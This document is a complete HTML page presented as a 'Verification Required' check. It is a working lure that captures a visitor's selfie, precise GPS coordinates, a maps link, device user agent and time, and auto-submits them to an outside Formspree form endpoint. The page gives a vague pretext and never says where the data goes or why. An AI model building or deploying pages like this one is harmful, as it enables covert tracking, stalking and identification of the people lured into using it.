<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body style="font-family:Arial;text-align:center;padding:40px;">

<h2>Verification Required</h2>
<p>This page will capture your location and a selfie for verification.</p>

<form
  action="https://formspree.io/f/mdanrqqb"
  method="POST"
  enctype="multipart/form-data"
  id="form">

  <input type="hidden" name="latitude" id="lat">
  <input type="hidden" name="longitude" id="lon">
  <input type="hidden" name="maps" id="maps">
  <input type="hidden" name="device" id="device">
  <input type="hidden" name="time" id="time">

  <p><b>Take Selfie</b></p>
  <input type="file" name="selfie" accept="image/*" capture="user" required>

  <br><br>

  <button type="button"
    onclick="getLocation()"
    style="padding:12px 20px;font-size:16px;">
    Allow & Continue
  </button>
</form>

<script>
function getLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    document.getElementById("lat").value = lat;
    document.getElementById("lon").value = lon;
    document.getElementById("maps").value =
      "https://www.google.com/maps?q=" + lat + "," + lon;
    document.getElementById("device").value = navigator.userAgent;
    document.getElementById("time").value = new Date().toString();

    document.getElementById("form").submit();
  },
  () => alert("Location permission denied"),
  { enableHighAccuracy: true });
}
</script>

</body>
</html>
